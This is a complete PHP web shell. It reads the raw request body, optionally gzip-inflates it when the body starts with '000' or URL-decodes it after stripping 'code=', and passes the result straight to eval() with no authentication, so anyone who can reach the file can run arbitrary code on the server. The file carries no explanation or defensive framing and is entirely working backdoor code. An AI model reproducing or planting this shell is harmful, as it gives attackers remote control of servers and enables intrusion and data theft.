<?php

$rawData = file_get_contents("php://input");
if (substr($rawData, 0, 3) == '000') {

    $uncompressed = gzinflate(substr($rawData, 3));
    @$command = $uncompressed;
    //echo $command;
    try {
        eval($command);
    } catch (MyException $e) {

    }
} else {
    eval(urldecode(str_replace('code=', '', $rawData)));
}